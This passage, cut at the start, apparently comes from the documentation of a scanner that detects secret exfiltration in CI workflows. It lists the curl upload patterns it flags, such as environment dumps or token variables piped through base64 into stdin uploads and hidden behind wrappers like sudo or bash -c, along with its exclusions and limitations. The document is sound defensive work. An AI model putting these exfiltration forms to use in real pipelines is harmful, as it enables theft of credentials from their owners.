(`'{"t":"'"$TOKEN"'"}'`). A secret on stdin from `echo`, `printf` or `cat` of a variable, or from a dump of the
environment (`env`, `printenv`, `set`, `export`, `declare`), optionally piped through `base64` (with its options,
`-w0`), is held with a `-d`/`--data*` `@-` upload, or a `curl -T -` / `curl --upload-file -` stdin upload. Credentials
only in authentication options or the URL are not treated as uploaded secret data, and public `$GITHUB_SHA`
(or `${GITHUB_SHA…}`) does not count as a secret unless the written text names `GITHUB_SHA` another way
(`GITHUB_SHA=$TOKEN`, an `env:` key, a comment). A local-file path in `-T`/`--upload-file` or `--post-file` is not
read and is not evidence of a secret upload. Only `curl -T -` / `curl --upload-file -` with a recognized secret on
stdin is held. It sees commands later in a block; after `;`, `&`, `&&`, `|` and `||`; after the keys `run:`,
`script:`, `before_script:`, `after_script:`, `command:`, `bash:`, `pwsh:` and `powershell:` and Jenkins'
`sh`, `bat` and `powershell` steps (`'''` and `"""` strings too); behind `sudo`, `doas`, `env`, `time`, `nohup`,
`command`, `exec`, `builtin`, `nice` and `timeout` with their options and numbers, assignments, `if`, `then`,
`else`, `elif`, `do`, `while`, `until`, `(`, `{`, `!` and `X=$(`; and absolute program paths. The text is also read
with each wrapper where a command starts (after a pipe too, with or without a blank, and one named by its path or
escaped: `| sudo curl`, `|sudo curl`, `/usr/bin/env curl`, `s\udo curl`) as what it runs, as the shell parser unwraps
one, a shell's `-c '…'` as its script, after its other options and a `--` (`| bash -e -c 'curl -d @- …'`), and a
command's first word without the `(` or `$(` it starts in (`| (curl -d @- …)`); a shell command's line is read so too
(`env | timeout 30 curl …` as `env | curl …`).
The 128-character spans prevent a pattern from reaching into another command.
It does not parse shell/YAML, expand variables, interpret scripts, or read generated workflows; see
[limitations](limits.md). It does not claim to detect general `nc` exfiltration.
